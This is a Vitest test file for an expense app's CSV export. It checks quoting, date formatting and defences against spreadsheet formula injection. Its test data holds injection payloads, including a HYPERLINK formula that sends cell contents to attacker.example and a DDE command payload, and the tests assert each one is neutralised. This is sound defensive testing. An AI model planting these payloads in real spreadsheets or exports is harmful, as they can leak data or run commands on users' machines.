import { describe, expect, it } from 'vitest'
import { csvDate, expensesToCsv, toCsvCell } from './csv'
import type { Expense } from '../types'

const expense = (overrides: Partial<Expense> = {}): Expense => ({
  id: 'e1',
  itemName: 'Kopi',
  amount: 1.8,
  category: 'Food',
  date: '2026-03-14T12:00:00',
  createdAt: '2026-03-14T12:00:00',
  ...overrides,
})

/** The calendar date this machine shows for an instant, as yyyy-MM-dd. */
const localYmd = (iso: string) => {
  const d = new Date(iso)
  const pad = (n: number) => String(n).padStart(2, '0')
  return `${String(d.getFullYear())}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}`
}

describe('toCsvCell', () => {
  it.each([
    ['=HYPERLINK("http://attacker.example/?d="&A1,"Refund")'],
    ["+cmd|' /C calc'!A0"],
    ['@SUM(1+1)'],
    ['-2+3'],
  ])('neutralises the audit payload %s', (payload) => {
    const cell = toCsvCell(payload)
    expect(cell.startsWith(`"'`)).toBe(true)
    expect(cell).toBe(`"'${payload.replace(/"/g, '""')}"`)
  })

  it.each([
    ['tab', '\t=1+1'],
    ['carriage return', '\r=1+1'],
    ['full-width equals', '\uFF1D1+1'],
    ['full-width plus', '\uFF0B1+1'],
    ['full-width minus', '\uFF0D1+1'],
    ['full-width at', '\uFF20SUM(1)'],
  ])('prefixes a %s leader', (_name, value) => {
    expect(toCsvCell(value)).toBe(`"'${value}"`)
  })

  it.each([
    ['spaces', '  =1+1'],
    ['a newline', '\n=1+1'],
    ['a no-break space', '\u00A0@SUM(1)'],
    ['an ideographic space', '\u3000-2+3'],
  ])('prefixes a formula hidden behind %s', (_name, value) => {
    expect(toCsvCell(value)).toBe(`"'${value}"`)
  })

  it('leaves ordinary text alone apart from quoting', () => {
    expect(toCsvCell('Chicken rice')).toBe('"Chicken rice"')
    expect(toCsvCell('Grab ride - home')).toBe('"Grab ride - home"')
    expect(toCsvCell('a=b')).toBe('"a=b"')
    expect(toCsvCell('鸡饭 🍗')).toBe('"鸡饭 🍗"')
  })

  it('doubles embedded quotes', () => {
    expect(toCsvCell('6" sub')).toBe('"6"" sub"')
    expect(toCsvCell('""')).toBe('""""""')
  })

  it('keeps commas and newlines inside one quoted cell', () => {
    expect(toCsvCell('rice, egg')).toBe('"rice, egg"')
    expect(toCsvCell('line 1\r\nline 2')).toBe('"line 1\r\nline 2"')
  })

  it('keeps numbers numeric, negatives and decimals included', () => {
    expect(toCsvCell(12.5)).toBe('"12.5"')
    expect(toCsvCell(-4.2)).toBe('"-4.2"')
    expect(toCsvCell(0)).toBe('"0"')
    expect(toCsvCell(-0.01)).toBe('"-0.01"')
  })

  it('treats a numeric-looking string as untrusted text', () => {
    expect(toCsvCell('-5')).toBe(`"'-5"`)
  })

  it('gives an empty cell for missing or non-finite values', () => {
    expect(toCsvCell(undefined)).toBe('""')
    expect(toCsvCell(null)).toBe('""')
    expect(toCsvCell(NaN)).toBe('""')
    expect(toCsvCell(Infinity)).toBe('""')
    expect(toCsvCell(-Infinity)).toBe('""')
    expect(toCsvCell('')).toBe('""')
  })
})

describe('csvDate', () => {
  it('keeps a noon-stored date on its calendar day', () => {
    expect(csvDate('2026-01-01T12:00:00')).toBe('2026-01-01')
    expect(csvDate('2026-12-31T12:00:00')).toBe('2026-12-31')
  })

  it('keeps local times at a month or year boundary on their own day', () => {
    expect(csvDate('2026-12-31T23:59:59')).toBe('2026-12-31')
    expect(csvDate('2027-01-01T00:00:00')).toBe('2027-01-01')
    expect(csvDate('2026-02-28T23:59:00')).toBe('2026-02-28')
    expect(csvDate('2026-03-01T00:00:00.000')).toBe('2026-03-01')
  })

  it('pads single-digit months and days', () => {
    expect(csvDate('2026-01-05T12:00:00')).toBe('2026-01-05')
    expect(csvDate('0999-09-09T12:00:00')).toBe('0999-09-09')
  })

  it('returns a date-only string unchanged instead of parsing it as UTC', () => {
    expect(csvDate('2026-01-01')).toBe('2026-01-01')
    expect(csvDate('2026-12-31')).toBe('2026-12-31')
  })

  it('shows a legacy UTC timestamp on the local calendar day', () => {
    const iso = '2026-01-01T12:30:00.000Z'
    const byZone: Record<string, string> = {
      'Asia/Singapore': '2026-01-01',
      'Pacific/Honolulu': '2026-01-01',
      'Pacific/Kiritimati': '2026-01-02',
    }
    const zone = Intl.DateTimeFormat().resolvedOptions().timeZone
    expect(csvDate(iso)).toBe(byZone[zone] ?? localYmd(iso))

    const lateUtc = '2026-12-31T20:00:00.000Z'
    const lateByZone: Record<string, string> = {
      'Asia/Singapore': '2027-01-01',
      'Pacific/Honolulu': '2026-12-31',
      'Pacific/Kiritimati': '2027-01-01',
    }
    expect(csvDate(lateUtc)).toBe(lateByZone[zone] ?? localYmd(lateUtc))
  })

  it('returns garbage as raw text instead of throwing', () => {
    expect(csvDate('not a date')).toBe('not a date')
    expect(csvDate('')).toBe('')
    expect(csvDate('2026-13-45T12:00:00')).toBe('2026-13-45T12:00:00')
  })
})

describe('expensesToCsv', () => {
  it('starts with a BOM, uses CRLF, and ends with a line break', () => {
    const csv = expensesToCsv([expense()])
    expect(csv.startsWith('\uFEFFDate,Item,Category,Amount,Notes\r\n')).toBe(true)
    expect(csv.endsWith('\r\n')).toBe(true)
    expect(csv.replace(/\r\n/g, '')).not.toMatch(/\n/)
  })

  it('writes one quoted row per expense in Date, Item, Category, Amount, Notes order', () => {
    const csv = expensesToCsv([
      expense({ itemName: 'Kopi', amount: 1.8, notes: 'with "kaya" toast' }),
      expense({
        id: 'e2',
        itemName: '=HYPERLINK("http://attacker.example","x")',
        category: '@SUM(1+1)',
        amount: -12.5,
        date: '2026-03-15',
        notes: undefined,
      }),
    ])
    expect(csv).toBe(
      '\uFEFFDate,Item,Category,Amount,Notes\r\n' +
        '"2026-03-14","Kopi","Food","1.8","with ""kaya"" toast"\r\n' +
        `"2026-03-15","'=HYPERLINK(""http://attacker.example"",""x"")","'@SUM(1+1)","-12.5",""\r\n`,
    )
  })

  it('gives a BOM and header only for no expenses', () => {
    expect(expensesToCsv([])).toBe('\uFEFFDate,Item,Category,Amount,Notes\r\n')
  })

  it('exports a record with a broken date instead of throwing', () => {
    const csv = expensesToCsv([expense({ date: 'garbage' })])
    expect(csv).toContain('\r\n"garbage","Kopi","Food","1.8",""\r\n')
  })

  it('builds 5,000 rows in under 200 ms', () => {
    const rows = Array.from({ length: 5000 }, (_, i) =>
      expense({
        id: `e${String(i)}`,
        itemName: i % 7 === 0 ? `=cmd${String(i)}` : `Item, "${String(i)}"`,
        amount: i % 2 === 0 ? i / 4 : -i / 4,
        date: `2026-0${String((i % 9) + 1)}-1${String(i % 10)}T12:00:00`,
        notes: i % 3 === 0 ? 'multi\nline' : undefined,
      }),
    )
    expect(expensesToCsv(rows).split('\r\n')).toHaveLength(5000 + 2)
    // That first run also warmed up the JIT. The best of three more keeps a busy machine
    // (other test files in parallel, a 2-core CI runner) from failing a fast function.
    const timings = [0, 1, 2].map(() => {
      const start = performance.now()
      expensesToCsv(rows)
      return performance.now() - start
    })
    expect(Math.min(...timings)).toBeLessThan(200)
  })
})
